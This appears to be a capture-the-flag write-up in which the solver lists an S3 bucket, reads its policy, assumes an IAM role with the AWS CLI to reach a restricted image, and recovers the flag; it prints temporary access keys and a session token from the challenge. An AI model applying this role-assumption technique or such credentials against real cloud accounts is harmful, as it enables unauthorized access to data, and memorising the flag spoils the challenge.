First add the credentials to your .aws/credentials file.

```
AWS_PROFILE=ctf aws s3 ls cats-in-a-bucket
```

We can see 4 files in the bucket, so let's fetch those first.

```
aws s3 sync s3://cats-in-a-bucket .

download failed: s3://cats-in-a-bucket/cat4.jpg to ./cat4.jpg An error occurred (AccessDenied) when calling the GetObject operation: Access Denied
download: s3://cats-in-a-bucket/cat1.jpg to ./cat1.jpg             
download: s3://cats-in-a-bucket/cat2.jpg to ./cat2.jpg              
download: s3://cats-in-a-bucket/cat3.jpg to ./cat3.jpg              
```

It seems like the 4th file does not allow to be downloaded.

Let's check the bucket policy

```
aws s3api get-bucket-policy --bucket cats-in-a-bucket                         

    "Policy": "{\"Version\":\"2008-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:user/misterbuttons\"},\"Action\":[\"s3:ListBucket\",\"s3:GetBucketPolicy\"],\"Resource\":\"arn:aws:s3:::cats-in-a-bucket\"},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:user/misterbuttons\"},\"Action\":\"s3:GetObject\",\"Resource\":[\"arn:aws:s3:::cats-in-a-bucket/cat1.jpg\",\"arn:aws:s3:::cats-in-a-bucket/cat2.jpg\",\"arn:aws:s3:::cats-in-a-bucket/cat3.jpg\"]},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:role/captainclaw\"},\"Action\":\"s3:ListBucket\",\"Resource\":\"arn:aws:s3:::cats-in-a-bucket\"},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:role/captainclaw\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::cats-in-a-bucket/cat4.jpg\"}]}"

```

We obviously need to get the final bucketpolicy namely

```
{
	"Effect":"Allow",
		"Principal":{
		   "AWS":"arn:aws:iam::261640479576:role/captainclaw"
		},
	"Action":"s3:GetObject",
	"Resource":"arn:aws:s3:::cats-in-a-bucket/cat4.jpg"
 }
```

If we try to assume the user role 

```
aws sts assume-role --role-arn "arn:aws:iam::261640479576:role/captainclaw" --role-session-name "clawsession1"

{
    "Credentials": {
        "AccessKeyId": "ASIATZ2X44NMBK73QC76",
        "SecretAccessKey": "5+PkHSmbESzJqXnjKmd+zMmVso0d+cCBh5efUc39",
        "SessionToken": "FwoGZXIvYXdzEL///////////wEaDH/1MZRXIrcqOLJkuCKwAbetLw/e+WYWJvWRKWv69QYunI79QExWz/j7mdkkxqfWOWRCdT8kFlgpWZLakBQdvkJCwiMZc0GLMUt6Cy81ijXrZsrQHeVrkwLg72sT5+9wtYBpcJmF3rdYjX+X3Ncyfk3CGaOu/R3XQlB+gtc3nFZjLNA6+QBqi3ouC6V4W7XFSupRTwejR3cyynTS8N4m8fM7iXX5Ykz85DS3OuUwG26vCsa6ownXtyFzHJYO31uUKLGL0qEGMi32IntLtp90ng9wGk+QZGvzXX+nEtYj+RA4d4xha0qUlPT7mcxG0tckVJSHSLs=",
        "Expiration": "2023-04-10T22:54:57+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROATZ2X44NMIIMXFXIG7:clawsession1",
        "Arn": "arn:aws:sts::261640479576:assumed-role/captainclaw/clawsession1"
    }
}

```

After adding this information in .aws/credentials you can fetch the image

```
aws s3api get-object --bucket cats-in-a-bucket --key cat4.jpg cat4.jpg
```

which contains the flag

he2023{r0l3_assum3d_succ3ssfuLLy}
